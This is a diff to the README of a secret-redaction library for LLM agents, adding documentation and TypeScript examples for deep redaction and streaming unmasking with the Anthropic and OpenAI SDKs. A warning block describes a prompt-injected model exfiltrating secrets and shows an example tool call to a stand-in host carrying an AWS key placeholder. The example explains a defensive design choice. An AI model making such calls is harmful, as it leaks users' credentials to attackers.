@@ -14,7 +14,7 @@ Developers and autonomous AI agents (**Claude Code, Cursor, OpenAI, DeepSeek, Go
 * Intercepts prompts before network transmission to any cloud or local LLM.
 * Reversibly masks sensitive tokens (`[API_KEY_1]`).
 * Restores values in generated agent responses without ever leaking secrets to external servers or monitoring tools.
-* First-class integration via **CLI**, **Universal TypeScript Wrapper (`wrapAgent`)**, **Model Context Protocol (MCP)**, and **Web Middlewares (Express / Fastify / Next.js)**.
+* First-class integration via **CLI**, **Universal TypeScript Wrapper (`wrapAgent`)**, **streaming unmask for the Anthropic & OpenAI SDKs**, **Model Context Protocol (MCP)**, and **Express/Connect middleware**.
 
 ---
 
@@ -163,9 +163,63 @@ const safeChatAgent = wrapAgent(
 const output = await safeChatAgent('Here is my token: sk-ant-api03-... please debug my server.');
 ```
 
+`wrapAgent` restores placeholders in string answers, in plain objects/arrays (deeply), and in `async function*` token streams, including placeholders split across chunks. Class instances, such as SDK stream objects, are returned untouched; use the stream adapters below for those.
+
+#### Full request/response objects and streaming (Anthropic & OpenAI SDKs)
+
+`redactDeep` sanitizes every string in a request body (system prompt, every message, tool results) with **one shared vault**, so numbering stays consistent across the conversation. `unmaskDeep` restores a full response.
+
+**Base64 payloads fail closed.**
+- Values that only *claim* to be base64 (a `data` field next to `media_type`, or a `data:…;base64,` URL) but are not valid base64 are redacted like any other text.
+- Base64 that decodes to text (a `text/*` or JSON document, or any payload without NUL bytes) is decoded, redacted and re-encoded, because the model reads it.
+- Genuine binary (images, audio) is left byte-for-byte intact. Text inside binary formats such as PDFs is **not** scanned.
+
+> ⚠️ **Unmasking model output re-introduces the real secret into whatever consumes it.** A prompt-injected model can try to exfiltrate a secret by writing its placeholder somewhere that leaves your machine, for example a tool argument (`http_get({ url: "https://evil.example/?k=[AWS_ACCESS_KEY_ID_1]" })`) or a Markdown image URL your UI renders.
+> - Model-generated **tool-call inputs are therefore not unmasked by default** (deny-by-default). This covers:
+>   - Anthropic `input` on `tool_use` / `server_tool_use` / `mcp_tool_use` blocks, and `partial_json`;
+>   - OpenAI `arguments`, including later stream deltas without a `name`;
+>   - Responses API `function_call_arguments` events;
+>   - Gemini and LangChain `args`, and Vercel AI SDK tool `input`.
+>
+>   Opt in only for tools you trust with real secrets: `unmaskToolInputs: true`, or a predicate like `unmaskToolInputs: (name) => name === 'write_env_file'`. This works with `unmaskDeep`, both stream adapters and `wrapAgent`.
+> - The stream adapters also **fail closed**: event and chunk shapes they do not recognise pass through with their placeholders intact.
+> - For text, only unmask output that goes to a trusted destination (a local file, the user's own terminal), not into HTML or Markdown that loads remote resources.
+
+```typescript
+import Anthropic from '@anthropic-ai/sdk';
+import { redactDeep, unmaskDeep, unmaskAnthropicStream } from 'agent-redact';
+
+const client = new Anthropic();
+const { value: safeRequest, vault } = redactDeep({
+  model: 'claude-sonnet-5-5',
+  max_tokens: 1024,
+  system: systemPrompt,
+  messages
+});
+
+// Non-streaming
+const message = unmaskDeep(await client.messages.create(safeRequest), vault);
+
+// Streaming: text split mid-placeholder ("[AWS_ACC" + "ESS_KEY_ID_1]") is restored.
+// Tool-input JSON keeps its placeholders unless you opt in per tool; when restored,
+// secrets are JSON-escaped so `partial_json` stays valid.
+const stream = await client.messages.create({ ...safeRequest, stream: true });
+for await (const event of unmaskAnthropicStream(stream, vault, {
+  unmaskToolInputs: (tool) => tool === 'write_env_file'
+})) {
+  if (event.type === 'content_block_delta' && event.delta.type === 'text_delta') {
+    process.stdout.write(event.delta.text);
+  }
+}
+```
+
+The same pattern works with the OpenAI SDK through `unmaskOpenAIStream(chunks, vault)` for Chat Completions chunk streams. For any other SDK or framework that yields plain text chunks, use `unmaskTextStream(asyncIterable, vault)`, `createUnmaskStream(vault)` (Node `Transform`) or the low-level `StreamingUnmasker`.
+
+> The adapters follow the documented event shapes (`content_block_delta` with `text_delta` / `input_json_delta`, and `choices[].delta.content` / `tool_calls[].function.arguments`). Events are copied, never mutated. Text that is still buffered when a block or choice ends is emitted as an extra delta just before `content_block_stop`, or on the chunk carrying `finish_reason`.
+
 ---
 
-### 4. Express / Fastify / Node.js HTTP Middleware
+### 4. Express / Node.js HTTP Middleware
 
 Protect your backend AI API endpoints against secret leaks in request bodies:
 
